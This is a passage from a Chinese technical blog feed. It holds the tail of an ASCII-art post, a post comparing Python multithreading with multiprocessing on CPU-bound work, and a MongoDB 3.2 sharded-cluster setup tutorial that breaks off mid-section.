#<span class="string">':########+###          #####++#####'</span>#+######;                          </span></span><br><span class="line"><span class="javascript">            ;, +########<span class="string">'##.          ;##'</span>#+++####<span class="string">'#+#######                          </span></span></span><br><span class="line"><span class="javascript">            </span>`  <span class="comment">######</span><span class="comment">###'##            ## +#+++###</span><span class="string">'#######'</span><span class="comment">#:                         </span></span><br><span class="line">               <span class="comment">######</span><span class="comment">##++## '##'.      +#  ##++###'######+''#                         </span></span><br><span class="line">              `<span class="javascript">########<span class="string">'###'</span>   .##:    ,#,####+###<span class="string">'######'</span><span class="string">''</span>#+                        </span></span><br><span class="line"><span class="javascript">              .########<span class="string">'### .:;:+,;:   ,##+:##+###'</span>######<span class="string">''</span><span class="string">'##+                       </span></span></span><br><span class="line"><span class="javascript">              ,########<span class="string">'##; ,###+#.    </span></span>`<span class="comment">##+###+###'######''#,##`                      </span></span><br><span class="line">              <span class="comment">######</span><span class="comment">###'##  `+:,#:`    `###</span>.:<span class="comment">#####'###</span><span class="comment">###''##.#+                      </span></span><br><span class="line"><span class="comment">             ###</span><span class="comment">######</span><span class="comment">#'#+    `+';      '##' `####'#######'#:###'                     </span></span><br><span class="line">            `<span class="javascript">##########<span class="string">'#+              ,#'</span>   ;###++######<span class="string">'#####:                     </span></span></span><br><span class="line"><span class="javascript">            </span>`<span class="comment">######</span><span class="comment">####'#+              `##    ###</span><span class="comment">#'###########+,                     </span></span><br><span class="line">             <span class="comment">######</span><span class="comment">####'##               ##.   +###</span><span class="string">'+######+###:.                     </span></span><br><span class="line"><span class="string">             :#########'</span><span class="comment">##               ###,  ,+###'########;#,,                     </span></span><br><span class="line">              <span class="comment">##+;#####+##:              :###+ .++###'#######:+#                      </span></span><br><span class="line">              <span class="comment">##'#######+#'               `'.#'.++###########`#'                      </span></span><br><span class="line">              +<span class="string">'########+##         :.  ,      :#++##########+#.                      </span></span><br><span class="line"><span class="string">             `'</span><span class="comment">######</span><span class="comment">######</span>                    <span class="comment">##+++##########'                       </span></span><br><span class="line">            .<span class="string">'#############`                   ###+++#########                        </span></span><br><span class="line"><span class="string">           .'</span>+<span class="comment">######</span><span class="comment">######</span><span class="comment">#'       `';,;.     .###++++########                        </span></span><br><span class="line">           <span class="comment">#'#########+#####     `###',;##`   +####++++#######.                       </span></span><br><span class="line">           +<span class="string">'#########'</span><span class="comment">#####;     #,###</span><span class="comment">#'#`  `######+++########`                      </span></span><br><span class="line">           <span class="comment">#'#########'######.    .#`   #;   +#######++#########,                     </span></span><br><span class="line">           <span class="string">'+########'</span><span class="comment">######</span><span class="comment">##`    `'++'.   :##########+##########,                   </span></span><br><span class="line">           `<span class="javascript">########<span class="string">'+##@######.           .###################;:+##'</span>,:               </span></span><br><span class="line"><span class="javascript">            ;###++<span class="string">''</span>############,         .####################;                      </span></span><br><span class="line"><span class="javascript">             #########@##########+       .#########@############;</span>`                    </span><br><span class="line">             `<span class="javascript">#####################+,..,+##################;#######:</span>`                 </span><br><span class="line">             ,<span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">##@###########: ###`'####,                </span></span><br><span class="line">            <span class="string">'######@###########################@##########. #### `###+                </span></span><br><span class="line"><span class="string">          `#################@########################@@@###+####+  ,'</span>`<span class="javascript">                </span></span><br><span class="line"><span class="javascript">         ,###########################################@###@@#######</span>`                   </span><br><span class="line">        +<span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">####@###</span><span class="comment">######</span>  `<span class="javascript">                  </span></span><br><span class="line"><span class="javascript">      </span>`<span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">####,                    </span></span><br><span class="line"><span class="comment">     :###</span><span class="comment">##:.###################################:#################:                   </span></span><br><span class="line">    <span class="string">'####+ :######@#####'</span> <span class="comment">#:##################@##'#################'                  </span></span><br><span class="line">   <span class="string">'#`### '</span><span class="comment">######</span><span class="comment">###`###</span>  ,,<span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">###:###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">###;                 </span></span><br><span class="line"><span class="comment">  .# ,##`'###</span><span class="comment">######</span><span class="string">' ###'</span> `<span class="javascript"><span class="string">':################;###+ ##################                 </span></span></span><br><span class="line"><span class="javascript"> </span>`<span class="comment">#' ###;##########. ####+`#;##############:  `### :#################;                </span></span><br><span class="line">,<span class="comment">#+,.##'###########: :##################;      ### +#################+                </span></span><br><span class="line"><span class="comment">#',,;##+############` ########;####+;.         '##`###################                </span></span><br><span class="line">+;.;+<span class="comment">#####:###</span><span class="comment">####@###</span>`<span class="javascript">#######+                <span class="string">'##.###################                </span></span></span><br><span class="line"><span class="javascript">,+</span>`+<span class="comment">#####',###</span><span class="comment">######</span><span class="comment">##,#######+                ###.##############@####                </span></span><br><span class="line"> <span class="comment">#:######' ################;:,                 ##;'############@######                </span></span><br><span class="line"> ,<span class="comment">######</span><span class="comment">## ,#######@#####+                    ;##.####################                </span></span><br><span class="line">  +<span class="comment">######</span><span class="comment">#+`############.                    ,##,#####################                </span></span><br><span class="line">   <span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">##.                   ,###;.####################+                </span></span><br><span class="line">   ,<span class="comment">######</span><span class="comment">######</span><span class="comment">###@##+                ;###</span><span class="comment">###' .###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">#####;                </span></span><br><span class="line"><span class="comment">    +###</span><span class="comment">######</span><span class="comment">######</span>+<span class="comment">#:                 `:###:   :###################.                </span></span><br><span class="line">     <span class="comment">#`############# ;;                '###'        .'###############+                </span></span><br><span class="line">     <span class="string">':.######'</span>.<span class="comment">###+  +                                .###</span><span class="comment">######</span>:;<span class="comment">##..               </span></span><br><span class="line">     :<span class="comment">#+#####. ####:  :                                  ;######## #;+##              </span></span><br><span class="line">     :`<span class="javascript">.<span class="string">'###'</span> +####    ,                                  :##:+###<span class="string">'#+,,               </span></span></span><br><span class="line"><span class="javascript">     #   </span>`<span class="comment">######</span><span class="comment">##                                         :#+ .##+'.`                </span></span><br><span class="line">    .:    <span class="comment">#+####'                                           ##  .#.+                  </span></span><br><span class="line">    <span class="comment">#    ;`.###,                                            +#  `# +                  </span></span><br><span class="line">   <span class="comment">#     ' +##,                                      ,      #+  #+ +                  </span></span><br><span class="line"> `<span class="javascript">+      .+##+                                        ;   </span>`+<span class="comment"># ,+#.`;                  </span></span><br><span class="line">:,       `<span class="javascript">###</span>`                                         <span class="string">'###; ;, +:'</span>                   </span><br><span class="line">         +<span class="comment">###                                               `: :#,:                   </span></span><br><span class="line"><span class="comment">         #,##                                               ;  ##:                    </span></span><br><span class="line"><span class="comment">         #`##                                               ' `.,                     </span></span><br><span class="line"><span class="comment">         ; ##,                                              ; :                       </span></span><br><span class="line"><span class="comment">         ` '##                                              , :                       </span></span><br><span class="line"><span class="comment">           `#+#`                                            ` `                       </span></span><br><span class="line"><span class="comment">            :# :',`                                          `                        </span></span><br><span class="line"><span class="comment">             :#                                                                       </span></span><br><span class="line"><span class="comment">               ,,</span></span><br></pre></td></tr></table></figure></p><p><strong>1.2</strong>  <a href="http://patorjk.com/software/taag/#p=testall&amp;f=Isometric2&amp;t=HelloWord" target="_blank" rel="noopener">Text to ASCII Art Generator (TAAG)</a><br>特点：支持自定义特殊字符替换<br>点击More Opts选择类型，输入替换字符即可<br>如下是将空格” “换成点”.”<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">......___...........___.......................................___.....</span><br><span class="line">...../\..\........./\__\...................................../\..\....</span><br><span class="line">.....\:\..\......./:/._/_.................................../::\..\...</span><br><span class="line">......\:\..\...../:/./\__\................................./:/\:\..\..</span><br><span class="line">..___./::\..\.../:/./:/._/_...___.....___...___.....___.../:/..\:\..\.</span><br><span class="line">./\../:/\:\__\./:/_/:/./\__\./\..\.../\__\./\..\.../\__\./:/__/.\:\__\</span><br><span class="line">.\:\/:/..\/__/.\:\/:/./:/../.\:\..\./:/../.\:\..\./:/../.\:\..\./:/../</span><br><span class="line">..\::/__/.......\::/_/:/../...\:\../:/../...\:\../:/../...\:\../:/../.</span><br><span class="line">...\:\..\........\:\/:/../.....\:\/:/../.....\:\/:/../.....\:\/:/../..</span><br><span class="line">....\:\__\........\::/../.......\::/../.......\::/../.......\::/../...</span><br><span class="line">.....\/__/.........\/__/.........\/__/.........\/__/.........\/__/....</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 技术研究 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python多进程vs多线程</title>
      <link href="/2016/07/22/Python_mutithreading_mutiprocessing/"/>
      <url>/2016/07/22/Python_mutithreading_mutiprocessing/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;近期处理亿级数据，发现对于耗费CPU的程序(正则检索等)而言Python的多线程由于线程调度还不如单线程效率高，然而多CPU环境下，多线程与单线程最多只能使得单个CPU达到100%利用率。利用Python多进程（multiprocessing）可以使得多个CPU同时工作，利用效率大大提升<br><a id="more"></a></p><h2 id="0x01原理介绍"><a href="#0x01原理介绍" class="headerlink" title="0x01原理介绍"></a>0x01原理介绍</h2><h3 id="1-1CPU密集型和IO密集型"><a href="#1-1CPU密集型和IO密集型" class="headerlink" title="1.1CPU密集型和IO密集型"></a>1.1CPU密集型和IO密集型</h3><p>&emsp;&emsp;CPU密集型：程序线性执行，大量占用CPU，总是接近100%（如：正则匹配替换大量文本）<br>&emsp;&emsp;IO密集型：程序大量时间花费在等待I/O操作，CPU总是闲置，在10%左右（如：网络请求）</p><h3 id="1-2python多线程和多进程"><a href="#1-2python多线程和多进程" class="headerlink" title="1.2python多线程和多进程"></a>1.2python多线程和多进程</h3><p>&emsp;&emsp;python的多线程和其他编程语言的多线程有很大的区别，python多线程即使在多核CPU主机上也只能使用一个CPU，不是真正意义上的并发执行。<br>&emsp;&emsp;对于IO密集型的程序而言，使用多线程技术可以在CPU阻塞等待的间隔执行其他操作，可以提高CPU的使用效率，PS:<a href="http://xlambda.com/gevent-tutorial/#websockets" target="_blank" rel="noopener">gevent</a>库协程技术也是只在IO密集型程序比较有效<br>&emsp;&emsp;对于CPU密集型的程序而言，原本CPU就是一直繁忙的状态，强制使用多线程技术，不会增加CPU的利用效率，却增加线程切换的代价，<strong>可能导致多线程的执行效率还不如单线程的执行效率</strong>。在多核CPU主机可以采用pytho多进程（multiprocessing）使得程序同时使用多个CPU，可以达到程序真实意义上的并行（进程数不要超过CPU核数）</p><h2 id="0x02实际对比"><a href="#0x02实际对比" class="headerlink" title="0x02实际对比"></a>0x02实际对比</h2><p>测试环境：<br>&emsp;&emsp;Ubuntu系统<br>&emsp;&emsp;16核CPU主机</p><h3 id="2-1多线程测试程序"><a href="#2-1多线程测试程序" class="headerlink" title="2.1多线程测试程序"></a>2.1多线程测试程序</h3><p>代码<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import Queue</span><br><span class="line">import threading</span><br><span class="line">queueLock = threading.Lock()</span><br><span class="line">workQueue = Queue.Queue()</span><br><span class="line">thread_num = <span class="number">11</span></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> (<span class="title">threading</span>.<span class="title">Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, Queue,id)</span></span><span class="symbol">:</span></span><br><span class="line">        threading.Thread.__init_<span class="number">_</span>(<span class="keyword">self</span>)</span><br><span class="line">        <span class="keyword">self</span>.q = Queue</span><br><span class="line">        <span class="keyword">self</span>.id = id</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> workQueue.empty()<span class="symbol">:</span></span><br><span class="line">            get_info(<span class="keyword">self</span>.q.get(),<span class="keyword">self</span>.id)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_info</span><span class="params">(data,threading_id)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>)<span class="symbol">:</span></span><br><span class="line">        a=str(threading)+data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>)<span class="symbol">:</span></span><br><span class="line">        workQueue.put(str(i))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(thread_num)<span class="symbol">:</span></span><br><span class="line">        thread = MyThread(workQueue, i)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="symbol">threads:</span></span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span><span class="symbol">:</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><p>运行python程序，监控CPU使用情况只有1个CPU在使用状态</p><p><img src="/static/picture/multithreading.png" alt="multithreading"></p><h3 id="2-2多进程测试"><a href="#2-2多进程测试" class="headerlink" title="2.2多进程测试"></a>2.2多进程测试</h3><p>代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span>  multiprocessing</span><br><span class="line">processors = []</span><br><span class="line">processor_num = <span class="number">11</span></span><br><span class="line">workQueue = multiprocessing.Queue()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_processor</span><span class="params">(q,id)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> workQueue.empty():</span><br><span class="line">            get_info(q.get(),id)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_info</span><span class="params">(data,processor_id)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>):</span><br><span class="line">        a=str(processor_id)+data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        workQueue.put(str(i))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(processor_num):</span><br><span class="line">        p = multiprocessing.Process(target=single_processor, args=(workQueue,i))</span><br><span class="line">        p.start()</span><br><span class="line">        processors.append(p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> processors:</span><br><span class="line">         i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><p>运行python程序，监控CPU使用情况可以看出有11个CPU均处于100%利用状态（注：进程数最好不要超过CPU核数）</p><p><img src="/static/picture/multiprocess.png" alt="multiprocessing"></p><h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><p>当程序功能需要大量使用CPU，没有IO等待延迟即程序为CPU密集型的时候，且主机为多核的情况下，Python多进程可以达到极好的效率。</p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MongoDB3.2集群搭建</title>
      <link href="/2016/07/21/MongoDB_shard/"/>
      <url>/2016/07/21/MongoDB_shard/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>&emsp;&emsp;MongoDB分布式集群搭建比较容易实现，为了优化项目的性能，实战并记录一下过程，更多信息参考<a href="https://docs.mongodb.com/manual/sharding/" target="_blank" rel="noopener">官方文档</a><br><a id="more"></a></p><h2 id="0x01-原理介绍"><a href="#0x01-原理介绍" class="headerlink" title="0x01 原理介绍"></a>0x01 原理介绍</h2><h3 id="1-1水平扩展和垂直扩展"><a href="#1-1水平扩展和垂直扩展" class="headerlink" title="1.1水平扩展和垂直扩展"></a>1.1水平扩展和垂直扩展</h3><p>1.水平扩展也叫横向扩展，通过提高CPU、内存的能力。（比方：钢铁侠抬起一辆车）<br>2.垂直扩展也叫纵向扩展或者分片（shard）,通过分割数据到不同的服务器，利用多台低存储、低内存的机器共同完成大数据的处理。（比方：十个人抬起一辆车）<br>&emsp;&emsp;如果有1T的数据需要存储，可以通过买1T的硬盘，实现单服务器存储，也可以通过4台256G硬盘的服务器实现分布式存储，如下图：</p><p><img src="../../../../static/picture/shard.png" alt="sharding"></p><h3 id="1-2mongodb集群组件"><a href="#1-2mongodb集群组件" class="headerlink" title="1.2mongodb集群组件"></a>1.2mongodb集群组件</h3><p><img src="../../../../static/picture/mongo_shard.png" alt="mongodb集群组件"><br>1.分片（shard）:是一个单独的mongod服务器或者复制集，存储集群的部分数据。<br>2.路由（mongos）根据应用请求分发读写请求信息到各个分片<br>3.配置服务器（config server）:存储数据分片信息，配置服务器如果宕机，整个集群处于不可用状态。<br><strong>注:生产环境中，为了提高容错能力和抗灾能力，配置服务器应该为复制集且为多台、mongos也应对于两台、分片均采用复制集</strong></p><h2 id="0x02-搭建实战"><a href="#0x02-搭建实战" class="headerlink" title="0x02 搭建实战"></a>0x02 搭建实战</h2><p>此次集群搭建实战基于一台主机之上，原理和多台主句上搭建一样。多台主机搭建要求分片服务器与配置服务器和mongos能相互访问。可参考<a href="http://docs.mongoing.com/manual-zh/tutorial/deploy-shard-cluster.html" target="_blank" rel="noopener">官方快速部署</a></p><h3 id="2-1环境与系统框架图"><a href="#2-1环境与系统框架图" class="headerlink" title="2.1环境与系统框架图"></a>2.1环境与系统框架图</h3><h4 id="2-1-1搭建环境"><a href="#2-1-1搭建环境" class="headerlink" title="2.1.1搭建环境"></a>2.1.1搭建环境</h4><p>&emsp;&emsp;Ubuntu 14.04<br>&emsp;&emsp;MongoDB 3.2.6<br>注:3.2.6修复了3.2.5及以前版本的shards 大数据分片“30 second network timeout”的bug </p><h4 id="2-1-2系统框架图"><a href="#2-1-2系统框架图" class="headerlink" title="2.1.2系统框架图"></a>2.1.2系统框架图</h4><p><img src="../../../../static/picture/mongodb%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA.png" alt="系统框架图"></p><h3 id="2-2建立数据库目录"><a href="#2-2建立数据库目录" class="headerlink" title="2.2建立数据库目录"></a>2.2建立数据库目录</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#三个分片目录和一个配置服务器目录</span></span><br><span class="line"><span class="title">mkdir</span> /<span class="class"><span class="keyword">data</span>/db1</span></span><br><span class="line"><span class="title">mkdir</span> /<span class="class"><span class="keyword">data</span>/db2</span></span><br><span class="line"><span class="title">mkdir</span> /<span class="class"><span class="keyword">data</span>/db3</span></span><br><span class="line"><span class="title">mkdir</span> /<span class="class"><span class="keyword">data</span>/configdb</span></span><br></pre></td></tr></table></figure><h3 id="2-3启动分片和config-server"><a href="#2-3启动分片和config-server" class="headerlink" title="2.3启动分片和config server"></a>2.3启动分片和config server</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mongod <span class="params">--port</span> 10001 <span class="params">--dbpath</span> <span class="string">/data/db1</span>&amp;</span><br><span class="line">mongod <span class="params">--port</span> 10002 <span class="params">--dbpath</span> <span class="string">/data/db2</span>&amp;</span><br><span class="line">mongod <span class="params">--port</span> 10003 <span class="params">--dbpath</span> <span class="string">/data/db3</span>&amp;</span><br><span class="line">mongod <span class="params">--configsvr</span>&amp;</span><br><span class="line"><span class="comment">#利用"&amp;"将mongod后台运行，也可以打开多个窗口单独运行mongod。</span></span><br></pre></td></tr></table></figure><p>注：笔者在某教材上看到：“–configsvr设置端口为27017，数据位置为/data/configdb 可以用–port 27019 –dbpath /data/configdb代替”，然而使用后者连接mongos，查看sh.status()会报如下错误</p><p><img src="../../../../static/picture/mongnos_sh.status%28%29.png" alt="mongos上执行sh.status()"><br>亲测这个报错问题可以mongo连接配置服务器执行sh.status()解决，不过最好还是使用官方”–configsvr”吧！</p><h3 id="2-4启动mongos"><a href="#2-4启动mongos" class="headerlink" title="2.4启动mongos"></a>2.4启动mongos</h3><p>开启一个新的窗口，由于mongos需要读取配置服务器的信息，配置服务器一定要在mongos之前运行<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#连接配置服务器，<span class="selector-tag">config</span> <span class="selector-tag">server</span>默认监听27019端口，<span class="selector-tag">mongos</span>默认监听27017端口</span><br><span class="line"><span class="selector-tag">mongos</span> <span class="selector-tag">--configdb</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:27019</span></span><br></pre></td></tr></table></figure></p><h3 id="2-5配置集群"><a href="#2-5配置集群" class="headerlink" title="2.5配置集群"></a>2.5配置集群</h3><p>再开启一个新的窗口</p><h4 id="2-5-1连接mongos"><a href="#2-5-1连接mongos" class="headerlink" title="2.5.1连接mongos"></a>2.5.1连接mongos</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#服务器上运行<span class="selector-tag">mongo</span>默认连接127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:27017</span></span><br><span class="line"><span class="selector-tag">mongo</span></span><br></pre></td></tr></table></figure><h4 id="2-5-2添加分片"><a href="#2-5-2添加分片" class="headerlink" title="2.5.2添加分片"></a>2.5.2添加分片</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sh</span><span class="selector-class">.addShard</span>("127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:10001")</span></span><br><span class="line"><span class="selector-tag">sh</span><span class="selector-class">.addShard</span>("127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:10002")</span></span><br><span class="line"><span class="selector-tag">sh</span><span class="selector-class">.addShard</span>("127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:10003")</span></span><br></pre></td></tr></table></figure><p>如下图：</p><p><img src="../../../../static/picture/mongos_addshard.png" alt="addShard"></p><h4 id="2-5-3数据分片"><a href="#2-5-3数据分片" class="headerlink" title="2.5.3数据分片"></a>2.5.3数据分片</h4><p>（1）启用数据库的分片<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sh</span><span class="selector-class">.enableSharding</span>(<span class="string">"test"</span>)</span><br></pre></td></tr></table></figure></p><p>（2）对集合数据分片<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#注意:如果对已存在的集合分片，片键（此为uaername）必须是已经建立索引</span></span><br><span class="line">sh.shardCollection(<span class="string">"test.student"</span>,&#123;<span class="string">"username"</span>:<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure></p><h4 id="2-5-4集群状态监控"><a href="#2-5-4集群状态监控" class="headerlink" title="2.5.4集群状态监控"></a>2.5.4集群状态监控</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">连接mongos</span></span><br><span class="line">mongo --port 27017</span><br><span class="line">sh.status()</span><br><span class="line"><span class="meta">#</span><span class="bash">如果分片信息较多，只显示部分信息，sh.status(&#123;<span class="string">"verbose"</span>:1&#125;)可以完全显示</span></span><br></pre></td></tr></table></figure><p>可以获得分片的信息，如图：</p><p><img src="../../../../static/picture/sh.status%28%29.png" alt="sh.status()"><br>至此，一个单机版的mongodb集群搭建完毕，应用连接mongos可以按照操作普通mongod的方式操作mongos,从而进行备份恢复数据库、数据插入和获取等。</p><h2 id="0x03-集群的其他操作"><a href="#0x03-集群的其他操作" class="headerlink" title="0x03 集群的其他操作"></a>0x03 集群的其他操作</h2><h3 id="3-1-从集群中删除分片"><a href="#3-1-从集群中删除分片" class="headerlink" title="3.1 从集群中删除分片"></a>3.1 从集群中删除分片</h3><h4 id="3-1-1连接到mongos"><a href="#3-1-1连接到mongos" class="headerlink" title="3.1.1连接到mongos"></a>3.1.1连接到mongos</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mongo</span></span><br><span class="line"><span class="selector-tag">use</span> <span class="selector-tag">admin</span></span><br><span class="line"><span class="selector-tag">db</span><span class="selector-class">.runCommand</span>( &#123; <span class="attribute">removeShard</span>: <span class="string">"shard000"</span> &#125; )</span><br></pre></td></tr></table></figure><p>立刻得到如下信息<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"msg"</span> : <span class="string">"draining started successfully"</span>,</span><br><span class="line">    <span class="attr">"state"</span> : <span class="string">"started"</span>,</span><br><span class="line">    <span class="attr">"shard"</span> : <span class="string">"shard000"</span>,</span><br><span class="line">    <span class="attr">"ok"</span> : <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但是分片删除操作没有完成，需要将删除分片上的所有数据迁移到其他的分片，可能会花费很长的时间（如果只有最后一个分片，禁止删除分片操作）<br>此时如果尝试删除其他分片，例如：执行<code>db.runCommand( { removeShard: &quot;shard001&quot; } )</code>会报错，提示不能同时删除多个分片<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"ok"</span> : 0,</span><br><span class="line"><span class="string">"errmsg"</span> : "<span class="type">Can</span><span class="symbol">'t</span> have more than one draining shard <span class="keyword">at</span> a time<span class="string">",</span></span><br><span class="line"><span class="string">"</span>code<span class="string">" : 117</span></span><br></pre></td></tr></table></figure></p><h4 id="3-1-2一段时间之后，运行db-runCommand-removeShard-quot-shard000-quot-检查数据迁移状态，返回如下"><a href="#3-1-2一段时间之后，运行db-runCommand-removeShard-quot-shard000-quot-检查数据迁移状态，返回如下" class="headerlink" title="3.1.2一段时间之后，运行db.runCommand( { removeShard: &quot;shard000&quot; } )检查数据迁移状态，返回如下"></a>3.1.2一段时间之后，运行<code>db.runCommand( { removeShard: &quot;shard000&quot; 